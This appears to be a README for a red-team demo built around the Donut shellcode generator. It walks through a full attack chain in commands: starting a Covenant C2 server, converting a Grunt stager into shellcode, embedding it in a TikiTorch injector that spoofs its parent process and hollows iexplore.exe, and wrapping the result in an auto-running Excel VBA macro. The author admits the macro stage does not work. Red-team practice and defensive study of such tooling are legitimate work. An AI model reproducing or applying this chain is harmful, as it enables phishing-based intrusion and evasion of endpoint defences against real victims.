*NOTE: THIS DEMO DOESN'T WORK! BECAUSE F$$$ THE DEMO GODS. All of my shit (and rasta's) works fine. Both the other shit (made by other people) doesn't. Basically TikiTorch and Donut are fine, but I don't have any good stagers to exec Assemblies or shellcode from a macro. Could probably do it in Excel4.0 but meh. Whatever, I may fix this later but don't use it for now.*

# Overview

This demo is complicated but demonstrates the depth of tradecraft possible with Donut in combination with other tools and frameworks. The steps we will follow are:

1) Setup Covenant and prove that we can get Grunts running on the target box.
2) Create a Grunt EXE and generate shellcode that runs it.
3) Prepare a .NET Assembly based on TikiTorch by rastamouse. It will create an iexplore.exe process with a spoofed parent of explorer.exe. Then it will inject shellcode into that new process through a variant of Process Hollowing. Embed the Grunt shellcode into this Assembly.
4) Genenerate shellcode from the injector .NET Assembly.
5) Use MaliciousMacroMSBuild to generate VBA that runs this shellcode through VBA in a Microsoft Office document.
6) Add the VBA macro to an Excel document to run on startup.
7) Open the document and run the macro. Get shellz.

# Preparing Covenant

IF IT HAS NOT BEEN RUN BEFORE, start the Covenant docker image with:
```
cd /testing/Covenant/Covenant
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /testing/Covenant/Covenant/Data:/app/Data covenant
```

IF IT HAS BEEN RUN BEFORE, start the Covenant docker image with:
```
docker start covenant
```

Visit `https://192.168.254.136:7443/`in your browser. Go to Listeners, set the proper Connect IP and start the Listener. Go to Launchers > Binary. Select .NET v4.0 as the target version, and generate a launcher. Download the new launcher to your Demo folder or use the one already there.

Inside the Demo folder, generate the shellcode for the Grunt:
```
.\donut.exe -f .\GruntStager.exe -e
```

The base-64 encoded copy should be in your clipboard if you are doing this on Windows. Otherwise, base64-encode the payload. For safe-keeping, keep the copy in Notepad or another text editor.

Test that the shellcode works by running:
```
.\loader.exe .\instance
```

If it worked, there should now be a new Grunt registered with Covenant and running in the `loader` process.

# Preparing the Payload

Now we will create a TikiTorch injector for the shellcode that we generated above, using the guide on Rasta's blog (https://rastamouse.me/2019/08/covenant-donut-tikitorch/).

```
cd TikiTorch-master
. .\Get-CompressedShellcode.ps1
Get-CompressedShellcode -inFile C:\...\05-Covenant\loader.bin | clip
```

Open up the TikiSpawn project in the TikiTorch solution. Open `Program.cs` and replace the compressed shellcode with that from above.

Build it as a release version. To test that it works, run the following in PowerShell:

```powershell
cd TikiTorch-master\TikiSpawn\bin\Release

[System.Reflection.Assembly]::LoadFile("C:\...\donut\demos\05-Covenant\TikiTorch-master\TikiSpawn\bin\Release\TikiSpawn.dll")

[TikiSpawn]::Flame()
```

Check Covenant to see if you have a callback.

# Generating the Shellcode

Now we will generate the shellcode for the TikiSpawn DLL that we created above.

```
cd ..\..\..\..\
.\donut.exe -f .\TikiTorch-master\TikiSpawn\bin\Release\TikiSpawn.dll -c TikiSpawn -m Flame
```

Test the shellcode with:
```
.\loader.exe .\instance
```

# Generating the Macro

```
python m3-gen.py -p shellcode -i /path/beacon.bin -o output.vba
```
